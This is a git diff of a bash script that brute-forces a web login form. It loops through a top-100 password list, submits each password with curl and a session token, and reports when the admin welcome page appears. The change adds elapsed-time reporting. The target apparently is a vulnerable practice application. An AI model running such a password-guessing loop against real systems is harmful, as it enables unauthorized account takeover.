@@ -19,6 +19,7 @@ curl -v -L -c cookies.txt -b cookies.txt \
 # read each line of password list file
 filename='../10-million-password-list-top-100.txt'
 
+start=`date +%s`
 while read line; do
   echo "using user: $USER and password: $line"
 
@@ -36,7 +37,10 @@ while read line; do
 
 
   if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
-    printf "\n 🎉 password found: $line using user: ${USER} token: ${TOKEN}\n"
+    end=`date +%s`
+    runtime=$((end-start))
+    printf "\n 🎉 password found: $line , using user: ${USER} and token: ${TOKEN}\n"
+    printf "\n elapsed time: ${runtime}s \n"
     exit 0
   else
     printf "\n 🥲 trying password: $line but failed.\n"
